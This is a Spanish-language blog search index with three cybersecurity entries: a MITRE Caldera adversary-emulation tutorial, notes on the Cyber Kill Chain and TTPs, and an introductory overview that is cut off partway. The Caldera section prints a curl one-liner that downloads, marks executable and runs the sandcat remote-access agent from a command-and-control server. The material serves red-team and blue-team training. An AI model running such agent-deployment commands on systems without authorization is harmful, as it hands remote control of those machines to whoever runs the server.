<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Caldera</title>
    <link href="/2021/11/18/Caldera/"/>
    <url>/2021/11/18/Caldera/</url>
    
    <content type="html"><![CDATA[<p>Caldera es un software de <strong>Emulación de Adversarios</strong> muy popular entre la comunidad de hackers trabajando en los equipos de Red Team, Blue Team y Incident Response.</p><h1 id="¿Como-instalar-Caldera"><a href="#¿Como-instalar-Caldera" class="headerlink" title="¿Como instalar Caldera?"></a>¿Como instalar Caldera?</h1><h2 id="Github-instalacion-Offline"><a href="#Github-instalacion-Offline" class="headerlink" title="Github / instalación Offline"></a>Github / instalación Offline</h2><ol><li>Clonamos el repositorio en nuestro equipo<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/mitre/caldera.git --recursive --branch 4.0.0-alpha<br></code></pre></td></tr></table></figure></li><li>Instalamos los requeriments.txt<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install -r requirements.txt<br></code></pre></td></tr></table></figure></li><li>Levantamos el servidor de Caldera. Por defecto utiliza el puerto 8888 del localhost -&gt; <a href="http://localhost:8888/">http://localhost:8888</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 server.py --insecure<br></code></pre></td></tr></table></figure></li></ol><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>Para la instalación, he seguido la web del siguiente enlace:<br><a href="https://caldera.readthedocs.io/en/2.6.6/Docker-deployment.html">https://caldera.readthedocs.io/en/2.6.6/Docker-deployment.html</a></p><ol><li>Clonamos el repositorio en nuestro equipo<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/mitre/caldera.git --recursive --branch 4.0.0-alpha<br></code></pre></td></tr></table></figure></li><li>Como el repositorio de Github contiene un fichero Dockerfile, crearemos nuestra propia imagen de docker a partir de este fichero.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t caldera:server<br></code></pre></td></tr></table></figure></li><li>Finalmente creamos el contenedor y levantamos el servidor de Caldera. Por defecto utiliza el puerto 8888 del localhost -&gt; <a href="http://localhost:8888/">http://localhost:8888</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --name caldera -p 7010:7010 -p 7011:7011 -p 7012:7012 -p 8888:8888 caldera:server<br></code></pre></td></tr></table></figure></li><li>Para poder iniciar sesión, necesitamos de las credenciales de los usuarios <strong>red</strong> y <strong>blue</strong>. Se pueden obtener de la siguiente forma:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it caldera bash<br>tail -5 /usr/src/app/conf/local.yml<br></code></pre></td></tr></table></figure></li></ol><h1 id="Agentes"><a href="#Agentes" class="headerlink" title="Agentes"></a>Agentes</h1><p>Un agente es un <strong>Troyano de Acceso Remoto (RAT)</strong> que deberemos instalar de forma temporal en los equipos que queramos simular técnicas tanto de ataque como de defensa. Este troyano no lo identifiqueis como algo malicioso para el equipo, es la forma que tiene el software de poder comunicarse con el equipo y poder simular los ataques.<br><img src="/img/Tools/Caldera/agents.png" alt="Figura 1: Menu de agentes"></p><p>En el botón de configuración se podrá definir el tiempo de vida de los agentes en los equipos y el nombre por defecto que van a utilizar. Además permite que estos agentes de base implementen una serie de habilidades, que por defecto no le vamos a añadir ninguna.<br><img src="/img/Tools/Caldera/agents_conf.png" alt="Figura 2: Configuración de agentes"></p><p>En el primer desplegable aparecerán varios tipos de agente en función del tipo de conexión que queramos establecer. Pensando con mentalidad de pentenster, una vez lograsemos explotar un sistema, deberiamos buscar formas de ganar persistencia, como por ejemplo: crear diferentes backdoors o puertas traseras para que en caso de ser detectados y erradicados del sistema, aún tengamos otros mecanismos para seguir permaneciendo y conectándonos a él. El troyano <strong>54ndc47</strong> o <strong>sandcat</strong> es el más utilizado para aprender a utilizar la herramienta.<br><img src="/img/Tools/Caldera/agents_deploy.png" alt="Figura 3: Creación de agentes"></p><p>Finalmente, deberiamos copiar el codigo que aparece en la imagen o a continuación, para que el equipo indicado aparezca en el menú de agentes:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">server=<span class="hljs-string">&quot;http://0.0.0.0:8888&quot;</span>;curl -s -X POST -H <span class="hljs-string">&quot;file:sandcat.go&quot;</span> -H <span class="hljs-string">&quot;platform:darwin&quot;</span> <span class="hljs-variable">$server</span>/file/download &gt; Atrox;chmod +x Atrox;./Atrox -server <span class="hljs-variable">$server</span> -v<br></code></pre></td></tr></table></figure><p><img src="/img/Tools/Caldera/agents_inst.png" alt="Figura 4: Agente instalado"></p><h1 id="Habilidades"><a href="#Habilidades" class="headerlink" title="Habilidades"></a>Habilidades</h1><p>Las habilidades son las diferentes técnicas que han sido reconocidas en el framework de MITRE&amp;TTACk por haberse utilizado durante diferentes tipos de ataques.<br>Los diferentes plugins añaden nuevas técnicas al framework de Caldera. Los módulos que incluyen el mayor número de técnicas son Atomic Red Team y Stockpile.<br><img src="/img/Tools/Caldera/abilities.png" alt="Figura 5: Menu de habilidades"></p><p>El buscador de Caldera nos permite buscar a grandes rasgos habilidades por su nombre o su ID respectivo de MITRE. Esta imagen es un ejemplo de en qué consiste latécnica “T1082 - Hostname Discovery”.<br><img src="/img/Tools/Caldera/abilities_tec.png" alt="Figura 6: Habilidad T1082"></p><p>Otra forma más efectiva de buscar las técnicas que ejecutan un comando en especifico, es haciendo uso de la terminal y un poco de bash scripting.<br>Por ejemplo, si quisiesemos hacer una búsqueda de las técnicas que utilizan el uso del comando “whoami”, deberíamos escribir en la terminal:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -rl <span class="hljs-string">&quot;whoami&quot;</span> /usr/src/app/plugins/stockpile/data/abilities/ | xargs head -n5<br></code></pre></td></tr></table></figure><p>Como resultado, obtendríamos las 3 técnicas que contienen el comando:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">==&gt; /usr/src/app/plugins/stockpile/data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml &lt;==<br>---<br><br>- id: c0da588f-79f0-4263-8998-7496b1a40596<br>  name: Identify active user<br>  description: Find user running agent<br><br>==&gt; /usr/src/app/plugins/stockpile/data/abilities/discovery/bd527b63-9f9e-46e0-9816-b8434d2b8989.yml &lt;==<br>---<br><br>- id: bd527b63-9f9e-46e0-9816-b8434d2b8989<br>  name: Current User<br>  description: Obtain user from current session<br><br>==&gt; /usr/src/app/plugins/stockpile/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml &lt;==<br>--- <br>- id: 55678719-e76e-4df9-92aa-10655bbd1cf4<br>  description: User enumeration<br>  name: cmd.exe information gathering<br>  tactic: collection<br></code></pre></td></tr></table></figure><h1 id="Adversarios"><a href="#Adversarios" class="headerlink" title="Adversarios"></a>Adversarios</h1><p>Los adversarios son perfiles de atacantes creados por los desarrolladores que engloban una serie de técnicas acorde a atacantes específicos. Esta herramienta nos permite crear nuestros propios adversarios y testear:</p><ul><li>Técnicas de red team sin tener conocimiento de los comandos que ejecuta realmente un atacante. Esto permite a un usuario de Blue Team comprobar de manera fácil y rápida que tan vulnerable es un sistema ante esos ataques. </li><li>Técnicas de blue team, cuando instalamos el agente de Blue el objetivo es -&gt; como atacante, ver que información puedo obtener de un sistema o aprender nuevos mecanismos para bypasear X protecciones<br>donde se busca bypasear un sistema protegido por los mecanismos establecidos del agente.</li></ul><p>Un ejemplo de adversario es “Noisy Neighbor”, que utiliza técnicas de reconocimiento las cuales mcuhas de ellas son facilmente detectables.<br><img src="/img/Tools/Caldera/adversaries.png" alt="Figura 7: Adversario Noisy Neighbor"></p><h1 id="Operaciones"><a href="#Operaciones" class="headerlink" title="Operaciones"></a>Operaciones</h1><p>Las operaciones son ataques emulados dirigidos a un grupo o varios grupos de equipos donde tengamos instalado los agentes.<br><img src="/img/Tools/Caldera/operations.png" alt="Figura 8: Menú Operaciones"></p><p>Deberemos definir un nombre a dicha operación, seleccionar uno de los atacantes creados por defecto o uno creado por nosotros mismos, los grupos a los que afecta dicha operación (el grupo se define en el apartado de Agentes) y muy importante marcar la opción de Auto-close como en la siguiente imagen.<br><img src="/img/Tools/Caldera/operations_creation.png" alt="Figura 9: Creación de Operaciones"></p><p>Cuando empezemos la operación aparecerá un menú como el de la siguiente imagen. Muestra paso a paso la técnica que se va utilizando, el dispositivo donde se realiza, el comando ejecutado y el restultado de dicho comando.<br><img src="/img/Tools/Caldera/operations_example.png" alt="Figura 10: Operación M4K4RR0N"></p><h1 id="Acceso"><a href="#Acceso" class="headerlink" title="Acceso"></a>Acceso</h1><p>El apartado Access utiliza la conexión establecida con el dispositivo que seleccionemos y ofrece la posibilidad de ejecutar técnicas dirigidas de forma manual e individual aprovechando el canal de C2 del agente instalado.<br><img src="/img/Tools/Caldera/access.png" alt="Figura 11: Menú Acceso"></p><h1 id="Entrenamiento"><a href="#Entrenamiento" class="headerlink" title="Entrenamiento"></a>Entrenamiento</h1><p>Finalmente está el apartado de entrenamiento, donde tendremos diferentes certificados enfocados tanto para uso de la aplicación a nivel de <strong>usuario</strong> como una certificación específica para <strong>Blue</strong>.<br><img src="/img/Tools/Caldera/trainning.png" alt="Figura 12: Menú Entrenamiento"></p>]]></content>
    
    
    <categories>
      
      <category>Herramientas</category>
      
      <category>Emulación de adversarios</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Herramientas</tag>
      
      <tag>IR</tag>
      
      <tag>Red Team</tag>
      
      <tag>Blue Team</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cyber Kill Chain</title>
    <link href="/2021/11/07/Cyber-Kill-Chain/"/>
    <url>/2021/11/07/Cyber-Kill-Chain/</url>
    
    <content type="html"><![CDATA[<h1 id="Cyber-Kill-Chain"><a href="#Cyber-Kill-Chain" class="headerlink" title="Cyber Kill Chain"></a><strong>Cyber Kill Chain</strong></h1><p>La <strong>Cyber Kill Chain</strong> es un framework creado por Lockheed Martin que explica los procedimientos que puede realizar un atacante en cada una de las fases de un ciberataque. Este modelo además, ayuda a las empresas a poder crear contramedidas y poder defenderse de dichos ataques.</p><h2 id="Metodologia"><a href="#Metodologia" class="headerlink" title="Metodología"></a>Metodología</h2><p>La metodología Cyber Kill Chain ayuda a los profesionales de la seguridad de la información a identificar los pasos de un atacante durante todo el proceso de un ataque. El framework contiene mecanismos de protección contra las amenazas que puedan aparecer durante las 7 fases, mejorando de ese modo activamente la detección y la respuesta a intrusiones.</p><p><img src="/img/Notes/Cyber_Kill_Chain/cyberkillchain.jpg" alt="Figura 1: Cyber Kill Chain"></p><p>Las 7 fases de un ataque consisten en:</p><h3 id="Reconocimiento"><a href="#Reconocimiento" class="headerlink" title="Reconocimiento"></a>Reconocimiento</h3><p>El atacante busca recopilar tanta información sobre el objetivo como sea posible, para buscar puntos débiles antes de atacar. Buscan información como la disponible públicamente en Internet, información de la red y información del sistema. Al realizar un reconocimiento en diferentes niveles de red, el adversario puede obtener información como bloques de red, direcciones IP específicas y detalles de los usuarios. El atacante suele utilizar herramientas de escaneo de hosts activos, puertos abiertos, software automatizado de descubrimiento de vulnerabilidades, etc.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Monitorización y análisis del sitio web de la organización objetivo.</li><li>Recopilar información sobre la organización objetivo mediante búsquedas en Internet, redes sociales o mediante ingeniería social.</li><li>Realización de Whois, DNS y footprinting de la red.</li><li>Utilizar herramientas de escaneo para identificar puertos y servicios abiertos.</li></ul><h3 id="Armamento"><a href="#Armamento" class="headerlink" title="Armamento"></a>Armamento</h3><p>El atacante analiza los datos recopilados en la etapa anterior para identificar las vulnerabilidades y técnicas que pueden explotar y obtener acceso no autorizado a la organización objetivo. En función de las vulnerabilidades identificadas durante el análisis, el adversario selecciona o crea una carga útil maliciosa (<strong>payload</strong>) entregable a medida (arma de malware de acceso remoto) utilizando un exploit que contiene un backdoor para enviársela a la víctima. </p><p>Un atacante puede marcar como target dispositivos de red específicos, sistemas operativos (<strong>SO</strong>), endpoints o incluso a personas dentro de la organización para llevar a cabo su ataque. Por ejemplo, el atacante puede enviar un correo electrónico de phishing a un empleado de la organización objetivo, que puede incluir un archivo adjunto malicioso como un virus o gusano que, cuando se descarga, instala un backdoor en el sistema que permite el acceso remoto al atacante.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Identificación de la carga útil (<strong>payload</strong>) de malware adecuada según el análisis.</li><li>Crear, reutilizar o modificar algún otro payload de malware disponible en función de la vulnerabilidad identificada.</li></ul><h3 id="Entrega"><a href="#Entrega" class="headerlink" title="Entrega"></a>Entrega</h3><p>El exploit creado previamente se transmite a las víctimas como un archivo adjunto de correo electrónico, a través de un enlace malicioso en sitios web o mediante una aplicación web vulnerable o una unidad USB. La entrega <strong>es una etapa clave</strong>, que mide la efectividad de las estrategias de defensa implementadas por la organización objetivo en función de si el intento de intrusión del atacante ha sido detectado y bloqueado o no.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Envío de correos electrónicos de <strong>phishing</strong> a los empleados de la organización objetivo.</li><li>Distribuir unidades USB que contienen cargas útiles maliciosas a los empleados de la organización objetivo.</li><li>Aprovechar vulnerabilidades existentes sobre los sistemas operativos, aplicaciones y servidores de la organización objetivo.</li></ul><h3 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h3><p>Una vez que el exploit se transmite a la víctima, la explotación activa el código malicioso del atacante para aprovechar una vulnerabilidad en el sistema operativo, la aplicación o el servidor en un sistema objetivo. Esta fase no solo consiste en la ejecución de exploits, sino que un atacante también puede explotar alguna vulnerabilidad debido a una mala configuración de seguridad por parte del personal responsable de mantener esos sistemas (LFI, RFI, SQL Injection, etc.).</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Explotar las vulnerabilidades de software o hardware para obtener acceso remoto al sistema de destino</li></ul><h3 id="Instalacion"><a href="#Instalacion" class="headerlink" title="Instalación"></a>Instalación</h3><p>El atacante una vez consigue acceso remoto al equipo objetivo, descarga e instala más software malicioso en el sistema para mantener el acceso a la red objetivo durante un período prolongado. Pueden usar el arma para instalar una puerta trasera para obtener acceso remoto. Además, el atacante obtiene la capacidad de propagar malware a otros sistemas de la red. Un atacante siempre intenta ocultar la presencia de sus actividades maliciosas de los controles de seguridad, como los firewalls, utilizando diversas técnicas, como el cifrado.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Mantener el acceso al sistema objetivo.</li><li>Descargar e instalar software malicioso, como backdoors.</li><li>Obtener acceso remoto al sistema.</li></ul><h3 id="Comando-y-control"><a href="#Comando-y-control" class="headerlink" title="Comando y control"></a>Comando y control</h3><p>El atacante crea un canal de comando y control, que establece una comunicación bidireccional entre el sistema de la víctima y el servidor controlado por el atacante para comunicarse y enviar datos de un lado a otro. Los atacantes suelen implementar técnicas como el cifrado para ocultar la presencia de dichos canales. Usando este canal, el atacante toma el control remoto del sistema o red objetivo.</p><p>Las acciones más comunes realizadas por los atacantes en esta fase son:</p><ul><li>Establecer un canal de comunicación bidireccional entre el sistema de la víctima y el servidor controlado por el atacante.</li><li>Aprovecharse de protocoles comunes como HTTP, ICM, DNS, etc. para tunelizar el tráfico y pasar más desapercibido. </li><li>Aplicar técnicas de escalada de privilegios</li><li>Ocultar las pistas mediante técnicas de cifrado.</li></ul><h3 id="Acciones-y-objetivos"><a href="#Acciones-y-objetivos" class="headerlink" title="Acciones y objetivos"></a>Acciones y objetivos</h3><p>El atacante controla el sistema objetivo desde una ubicación remota y finalmente logra sus objetivos. El atacante obtiene acceso a información sensible, y obtiene la capacidad de interrumpir o destruir los servicios del sistema, aparte de poder comprometer más sistemas de la red. Además, el atacante puede utilizar este sistema explotado como punto de partida para realizar otros ataques.</p><h2 id="Tacticas-Tecnicas-y-Procedimientos-TTPs"><a href="#Tacticas-Tecnicas-y-Procedimientos-TTPs" class="headerlink" title="Tácticas, Técnicas y Procedimientos (TTPs)"></a>Tácticas, Técnicas y Procedimientos (TTPs)</h2><p>Las tácticas, técnicas y procedimientos son patrones de actividades y métodos que ayudan a identificar grupos criminales o Advanced Persistent Threads (<strong>APTs</strong>) relacionados. Para poder implementar una buena defensa en un sistema, es muy importante entender estas TTPs para poder, de esa forma conocer como suelen actuar los distintos APTs. Entender las TTPs ayuda a predecir y detectar actividades anómalas antes de que puedan volverse una amenaza mayor, aparte de identificar vulnerabilidades en los sistemas y poder implementar o mejorar los mecanismos de defensa.</p><h3 id="Tacticas"><a href="#Tacticas" class="headerlink" title="Tácticas"></a>Tácticas</h3><p>Las tácticas describe la forma de actuar de actores de amenaza durante las diferentes fases de un ataque. Todo ataque consiste en un conjunto de tácticas para recolectar información, realizar una escalada de privilegios y ganar persistencia en el sistema. Los APTs suelen tener un conjunto de tácticas predefinidas pero, en algunas circunstancias pueden llegar a alterar su forma de atacar. Por ello, las empresas pueden identificar a los diferentes APTs en función de las tácticas que utilicen en ese moomento.</p><p>Una forma para detectar a los diferentes grupos de  APTs, se basa en conocer el conjunto de herramientas que utilizan para elaborar el ataque. Por ejemplo, en el caso de detectar un canal de Comando y control (<strong>C&amp;C</strong>), se puede descubrir la geolocalización aproximada de a que lugar del mundo pertenece el servidor de C&amp;C. Si se sabe que hay solo 3 APTs que actúan desde ese país, se puede aproximar mucho más la investigación de esos grupos y ver que otras tácticas suelen utilizar.</p><h3 id="Tecnicas"><a href="#Tecnicas" class="headerlink" title="Técnicas"></a>Técnicas</h3><p>Las técnicas son las diferentes acciones que se realizan en cada una de las tácticas de las diferentes fases de un ataque. Un ejemplo podrías ser:</p><ul><li>Para la táctica de reconocer puertos abiertos en un sistema específico, las técnicas serían la utilización de la herramienta Nmap con las flags adecuadas o estudiar el tipo de respuesta en base a una trama ICMP (<strong>ping</strong>).</li></ul><p>Las técnicas pueden ser analizadas en cada una de las fases del ciclo de vida de un ataque. Las técnicas no tienen porque solo ser aspectos técnicos, la ingeniería social es una técnica que no requiere de ningún tipo de software y en cambio es muy efectiva. Cabe destacar que las técnicas de ingeniería social se suele utilizar en la fase inicial de un ataque, ya que a partir de ahí se pueden obtener nombres de empleados, correos electrónicos, números de teléfono y otro tipo de información muy útil a la hora de explotar controles de accesos.</p><p>Las técnicas utilizadas en las fases un poco más desarrolladas cada vez dependen más de aspectos técnicos o conjunto de herramientas de software a utilizar, como son conocimiento de técnicas para elaborar escalada de privilegios en los sistemas o realizar movimientos laterales para evitar ser detectado.</p><p>Las técnicas en la última fase del ataque puede mezclar aspectos técnicos y no técnicos. Un ejemplo podría ser:</p><ul><li>El atacante una vez ha obtenido acceso privilegiado al sistema, encripta los ficheros que pretende robar, los envía por el canal de C&amp;C y los almacena en su sistema. Una vez ya tiene la información en su poder, utiliza herramientas puramente técnicas para limpiar todos los logs que haya podido generar y así no poder ser rastreado.</li></ul><h3 id="Procedimientos"><a href="#Procedimientos" class="headerlink" title="Procedimientos"></a>Procedimientos</h3><p>Los procedimientos son la secuencia de acciones realizadas por los APTs en las diferentes fases del ciclo de vida de un ataque. El número de acciones a realizar en una misma fase puede variar entre un ataque y otro, con el fin de obtener el mismo objetivo intermedio. Esto es debido a que aumenta las probabilidades de lograr el objetivo y reduce las probabilidades de ser detectado por los mecanismos de seguridad.</p><p>Comprender y analizar los procedimientos implementados en el ataque, puede ayudar a identificar los actores de amenaza. Intentar perfilar un APT en la fase inicial de un ataque puede ser complicado. Sin embargo, conforme los atacantes avanzan en las fases de un ataque, es más fácil comprender quienes son los actores de amenaza y cual es su objetivo final.</p>]]></content>
    
    
    <categories>
      
      <category>Apuntes</category>
      
      <category>Introducción al Ethical Hacking</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Teoría</tag>
      
      <tag>Fundamental</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Introducción a la ciberseguridad</title>
    <link href="/2021/11/05/Introduction_to_ETH/"/>
    <url>/2021/11/05/Introduction_to_ETH/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduccion-a-la-ciberseguridad"><a href="#Introduccion-a-la-ciberseguridad" class="headerlink" title="Introducción a la ciberseguridad"></a>Introducción a la ciberseguridad</h1><p>La seguridad de la información se refiere a la protección de la información y los sistemas que almacenan y transmiten estos activos contra el acceso no permitido, la exposición, la alteración y la destrucción de la información. Hay que evitar a toda costa que la información que se quiera proteger caiga en malas manos, ya que puede exponer datos sensibles tanto a nivel personal (números de teléfono, DNI, dirección del domicilio, etc.) como a nivel empresarial (información tanto de la propia empresa como de los clientes).</p><h2 id="Los-5-pilares-de-la-ciberseguridad"><a href="#Los-5-pilares-de-la-ciberseguridad" class="headerlink" title="Los 5 pilares de la ciberseguridad"></a>Los 5 pilares de la ciberseguridad</h2><p><img src="/img/Notes/Intro_to_ETH/pilares.png" alt="Figura 1: Los 5 principios de la ciberseguridad"></p><p>El bienestar de la información consiste en mantener el estado de los activos y de los servicios con un riesgo bajo o tolerable. Para ello hay que tener presente los 5 pilares de la ciberseguridad:</p><h3 id="Confidencialidad"><a href="#Confidencialidad" class="headerlink" title="Confidencialidad"></a>Confidencialidad</h3><p>La confidencialidad es la garantía de que la información es accesible solo para los autorizados. Las violaciones de la confidencialidad pueden ocurrir debido a un manejo inadecuado de los datos o un intento de piratería. Los controles de confidencialidad incluyen clasificación de datos, cifrar la información y eliminación adecuada de equipos (como DVDs, unidades USBs, etc.).</p><h3 id="Integridad"><a href="#Integridad" class="headerlink" title="Integridad"></a>Integridad</h3><p>La integridad es la fiabilidad de la información ante la prevención de cambios inapropiados y no autorizados, es la garantía de que la información es lo suficientemente precisa para su propósito. Las medidas para mantener la integridad de los datos pueden incluir una <strong>suma de comprobación</strong> (un número producido por una función matemática para verificar que un bloque de datos determinado no cambia o “<strong>CHECKSUM</strong>“) y un control de acceso (que garantiza que solo las personas autorizadas puedan actualizar, agregar o eliminar datos).</p><h3 id="Disponibilidad"><a href="#Disponibilidad" class="headerlink" title="Disponibilidad"></a>Disponibilidad</h3><p>La disponibilidad es la garantía de que los sistemas responsables de entregar, almacenar y procesar la información son accesibles cuando los usuarios autorizados lo requieran. Las medidas para mantener la disponibilidad de los datos pueden incluir matrices de discos para sistemas redundantes (Sistemas <strong>RAID</strong>) y máquinas agrupadas (o <strong>Cluster</strong>), software antivirus para combatir el malware y sistemas distribuidos de prevención de denegación de servicio (DDoS).</p><h3 id="Autenticidad"><a href="#Autenticidad" class="headerlink" title="Autenticidad"></a>Autenticidad</h3><p>La autenticidad se refiere a la característica de la comunicación, los documentos o cualquier dato que asegure la calidad de ser genuinos o no corruptos. El papel principal de la autenticación es confirmar que un usuario es genuino. Los controles como la biometría, las tarjetas inteligentes y los certificados digitales garantizan la autenticidad de los datos, las transacciones, las comunicaciones y los documentos.</p><h3 id="No-repudio"><a href="#No-repudio" class="headerlink" title="No repudio"></a>No repudio</h3><p>El no repudio es una forma de garantizar que el remitente de un mensaje no pueda negar posteriormente haber enviado el mensaje y que el destinatario no pueda negar haber recibido el mensaje. Las personas y las organizaciones utilizan firmas o certificados digitales para garantizar el no repudio.</p><h2 id="Motivos-metas-y-objetivos-de-los-ataques"><a href="#Motivos-metas-y-objetivos-de-los-ataques" class="headerlink" title="Motivos, metas y objetivos de los ataques"></a><strong>Motivos, metas y objetivos de los ataques</strong></h2><p>Los atacantes generalmente tienen motivos (metas) y objetivos detrás de sus ataques a la seguridad de la información. Un motivo se origina en la noción de que un sistema de destino almacena o procesa algo valioso o simplemente como acto de venganza, lo que conduce a la amenaza de un ataque al sistema. </p><p>Por tanto, estos motivos u objetivos dependen del estado de ánimo del atacante, de su razón para realizar dicha actividad, así como de sus recursos y capacidades. Una vez que el atacante determina su objetivo, puede emplear varias herramientas, técnicas de ataque y métodos para explotar las vulnerabilidades en los sistemas, políticas y controles de seguridad.</p><div style="text-align:center; font-weight: bold">Ataques = Motivo (objetivo) + Método + Vulnerabilidad</div><br><p>Los motivos más comunes detrás de un ataque pueden ser:</p><ul><li>Exigir un rescate</li><li>Provocar pérdidas económicas al objetivo</li><li>Interrumpir la continuidad del negocio</li><li>Realizar un robo de información</li><li>Dañar la reputación del objetivo</li><li>Manipular datos</li><li>Venganza</li></ul><h2 id="Categorias-de-ataques"><a href="#Categorias-de-ataques" class="headerlink" title="Categorías de ataques"></a>Categorías de ataques</h2><h3 id="Ataques-Pasivos"><a href="#Ataques-Pasivos" class="headerlink" title="Ataques Pasivos"></a>Ataques Pasivos</h3><p>Los ataques pasivos implican interceptar y monitorear el tráfico de la red y el flujo de datos en la red objetivo y no alterar los datos. Los atacantes realizan un reconocimiento de las actividades de la red mediante rastreadores (<strong>sniffers</strong>). Estos ataques son muy difíciles de detectar ya que el atacante no tiene una interacción activa con el sistema o la red objetivo. Los ataques pasivos permiten a los atacantes capturar los datos o archivos que se transmiten en la red sin el consentimiento del usuario. Por ejemplo, un atacante puede obtener información como datos en tránsito sin cifrar, credenciales en texto plano (sin cifrar) u otra información confidencial que sea útil para realizar ataques activos.</p><p>Ejemplos más comúnes de ataques pasivos:</p><ul><li>Análisis del tráfico de red</li><li>Olfatear o escuchar a escondidas (<strong>Sniffing</strong> and <strong>eavesdropping</strong>)</li><li>Descifrar tráfico con algoritmos de encriptación débil</li><li>Footprinting</li></ul><div style="page-break-after: always; break-after: page;"></div><h3 id="Ataques-Activos"><a href="#Ataques-Activos" class="headerlink" title="Ataques Activos"></a>Ataques Activos</h3><p>Los ataques activos manipulan los datos en tránsito o interrumpen la comunicación o los servicios entre los sistemas para tratar de saltarse los sistemas de seguridad y poder irrumpir en los sistemas. Los atacantes lanzan ataques en los sistemas o en la red objetivo provocando de esta forma tráfico detectable. Estos ataques penetran e infectan la red interna del objetivo y obtienen acceso a un sistema remoto para comprometer la red interna.</p><p>Ejemplo más comúnes de ataques activos:</p><ul><li><p>Escalada de privilegios (<strong>Privilege Escalation</strong>)</p></li><li><p>Ataques de malware (como virus, gusanos, ransomware, troyanos, logic boombs, etc.)</p></li><li><p>Acceso por puerta trasera (<strong>Backdoor</strong>)</p></li><li><p>Ataques basados en contraseñas (<strong>Bruteforce</strong>)</p></li><li><p>Inyección SQL (<strong>SQL Injection</strong>)</p></li><li><p>Ataques XSS (<strong>XSS - Cross Site Scripting Attacks</strong>)</p></li><li><p>Ataque de denegación de servicio (DoS)</p></li><li><p>Ataques de suplantación (<strong>Spoofing Attacks</strong>)</p></li><li><p>Ataques de repetición (<strong>Replay Attacks</strong>)</p></li><li><p>Secuestro de sesión (<strong>Session Hijacking</strong>)</p></li><li><p>Ataque man-in-the-middle (<strong>MiTM</strong>)</p></li><li><p>Envenenamiento por DNS y ARP (<strong>DNS and ARP Poisonning</strong>)</p></li><li><p>Perfilado (<strong>Profilling</strong>)</p></li><li><p>Ejecución de código arbitrario</p></li><li><p>Explotación de software de aplicaciones y sistemas operativos</p></li><li><p>Ataques transversales de directorio (<strong>LFI and RFI Attacks</strong>)</p></li></ul><h3 id="Ataques-Perimetrales-o-Externos"><a href="#Ataques-Perimetrales-o-Externos" class="headerlink" title="Ataques Perimetrales o Externos"></a>Ataques Perimetrales o Externos</h3><p>Los ataques perimetrales o externos se realizan cuando el atacante se encuentra físicamente cerca del perímetro del objetivo con el fin de irrumpir en los sistemas o la red objetivo. El objetivo principal de realizar este tipo de ataque es recopilar o interrumpir su acceso. Los atacantes pueden ganar acceso a puertas abiertas o obtener algún tipo de información sensible gracias a estar escondidos/ocultos.</p><p>Ejemplos más comunes de ataques perimetrales:</p><ul><li>Ingeniería Social (escuchas clandestinas (<strong>Eavesdropping</strong>), obtener información públicada vía internet, buscando en la basura (<strong>Dumpster diving</strong>), etc.).</li></ul><h3 id="Ataques-Internos-Insiders"><a href="#Ataques-Internos-Insiders" class="headerlink" title="Ataques Internos - Insiders"></a>Ataques Internos - Insiders</h3><p>Los ataques internos los realizan personas de confianza que tienen acceso físico a los activos críticos del objetivo (<strong>Insiders</strong>). Los insiders pueden eludir fácilmente los mecanismos de seguridad, corromper activos críticos y acceder a información confidencial debido a su acceso con privilegios. El objetivo de los insiders es afectar directamente la confidencialidad, integridad y disponibilidad de los sistemas de información. Estos ataques afectan a la reputación y las ganancias de la organización. Es bastante difícil imaginar un ataque interno, ya que se supone que todas las personas que estan contratadas tienes cierto grado de confianza con ellas.</p><p>Ejemplos de ataques internos:</p><ul><li>Eavesdropping y pinchadas telefónicas (<strong>wiretapping</strong>)</li><li>Robo de dispositivos físicos</li><li>Robo y filtración de datos</li><li>Plantar <strong>Keyloggers</strong>, backdoors o malware</li></ul><h3 id="Ataques-en-la-distribuicion"><a href="#Ataques-en-la-distribuicion" 